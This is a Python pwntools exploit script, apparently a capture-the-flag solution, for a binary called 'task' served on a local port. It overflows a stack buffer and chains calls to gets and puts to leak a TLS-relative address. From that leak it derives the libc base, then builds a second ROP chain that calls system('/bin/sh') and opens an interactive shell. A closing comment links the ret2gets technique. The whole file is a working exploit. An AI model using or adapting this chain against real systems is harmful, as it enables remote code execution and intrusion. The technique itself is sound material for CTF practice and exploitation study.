#!/usr/bin/env python3

from pwn import *

context.log_level = "debug"
elf = ELF("./task")
libc = ELF("./libc.so.6")
context.binary = elf
context.terminal = ["ghostty", "-e"]

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("127.0.0.1", 9001)

rop = ROP(elf)
rop.raw(b"A" * 0x28)
rop.call("gets")
rop.call("gets")
rop.call("gets")
rop.call("puts")
rop.call("main")
p.sendline(rop.chain())

p.sendline(b"\x01")
p.sendline(p32(0x0) + b"A" * 4 + b"B" * 8)
p.sendline(b"CCCC")

p.recvline()
p.recv(8)
tls = u64(p.recv(6).ljust(8, b"\x00"))
libc.address = tls + 0x28c0

rop = ROP(libc)
rop.raw(b"A" * 0x28)
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.call("system")
p.sendline(rop.chain())

p.interactive()

# https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets
